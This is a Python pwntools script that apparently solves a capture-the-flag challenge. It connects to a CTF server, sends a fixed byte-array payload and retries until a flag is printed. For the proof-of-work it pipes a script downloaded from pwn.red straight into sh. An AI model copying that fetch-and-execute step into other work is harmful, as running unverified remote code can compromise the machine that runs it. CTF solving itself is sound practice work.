#!/usr/bin/env python3
# pip install pwntools
from pwn import remote, context
import re, subprocess, time

context.log_level = "info"   # change to "debug" to see full I/O

HOST, PORT = "ctfi.ng", 31126
N = 1024                                  # must be >= 1024
PAYLOAD = "[" + ",".join(["238"]*N) + "]" # 0xEE everywhere (period-2)

POW_TOKEN_RE = re.compile(rb"pwn\.red/pow \| sh -s ([^\s]+)")
FLAG_RE = re.compile(r"Here is your flag:\s*(\S+)")

def solve_pow_from(buf: bytes) -> bytes | None:
    """
    If PoW is present in the buffer, solve it and return the solution bytes.
    Otherwise return None.
    """
    m = POW_TOKEN_RE.search(buf)
    if not m:
        return None
    token = m.group(1).decode()
    sol = subprocess.check_output(
        ['bash','-lc', f'curl -sSfL https://pwn.red/pow | sh -s {token}'],
        timeout=120
    ).decode().strip()
    return sol.encode()

def run_once() -> str | None:
    io = remote(HOST, PORT)

    # Slurp whatever banner/pow text shows up first
    buf = io.recvrepeat(1.0)

    # If the banner didn’t include everything yet, read a bit more
    if b"Enter the bytes:" not in buf and b"solution:" not in buf:
        try:
            buf += io.recvuntil(b":", timeout=5)
        except Exception:
            pass

    # Solve PoW if needed
    if b"proof of work" in buf or b"pwn.red/pow" in buf or b"solution:" in buf:
        sol = solve_pow_from(buf)
        if sol is None:
            # Sometimes the token is printed after we send a newline
            try:
                more = io.recvuntil(b"solution:", timeout=5)
                sol = solve_pow_from(buf + more)
            except Exception:
                pass
        if sol is None:
            io.close()
            raise RuntimeError("Could not parse PoW token")
        io.sendline(sol)
        # wait until input prompt
        io.recvuntil(b"Enter the bytes:", timeout=15)
    else:
        # Ensure we are at the input prompt
        if b"Enter the bytes:" not in buf:
            io.recvuntil(b"Enter the bytes:", timeout=15)

    # Send the period-2 payload and IMMEDIATELY send a guess line
    io.sendline(PAYLOAD.encode())

    # Don’t risk a race; send the second line without waiting
    # (server ignores its content anyway)
    # If you prefer, uncomment the next line to sync with the prompt first:
    # io.recvuntil(b"Make a guess:", timeout=10)
    io.sendline(b"x")

    # Read the rest (the program ends after printing result)
    out = io.recvall(timeout=15).decode(errors="ignore")
    io.close()

    m = FLAG_RE.search(out)
    if "Correct!" in out and m:
        return m.group(1)
    elif "Correct!" in out:
        # flag printed differently; return whole output for inspection
        return out
    else:
        return None

if __name__ == "__main__":
    # Retry loop: success probability is ~50% per attempt (even number of rounds)
    for attempt in range(1, 30):
        try:
            res = run_once()
            if res:
                print("[+] Got it:")
                print(res)
                break
            else:
                print(f"[-] Miss (likely odd round or timing). Retrying... [{attempt}]")
        except Exception as e:
            print(f"[!] Error: {e}. Retrying...")
        time.sleep(0.3)
